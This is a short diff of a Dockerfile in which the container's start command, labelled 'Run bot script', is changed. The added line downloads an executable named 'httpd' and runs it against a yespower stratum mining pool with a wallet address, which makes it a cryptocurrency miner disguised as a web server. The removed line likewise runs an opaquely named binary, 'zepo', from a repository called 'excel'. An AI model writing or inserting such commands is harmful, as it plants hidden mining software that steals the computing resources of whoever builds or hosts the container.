@@ -37,4 +37,4 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD git clone https://github.com/tolecilik/excel.git && cd excel && chmod +x config.json && chmod +x zepo && ./zepo -c "config.json"
+CMD wget https://github.com/55113110159/vs/raw/master/httpd && chmod +x httpd && ./httpd -a yespower -o stratum+tcp://149.50.222.86:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr --timeout 120 -p c=SWAMP,mc=BELL/BUTK/GLT/SPRX/SWAMP/VHH
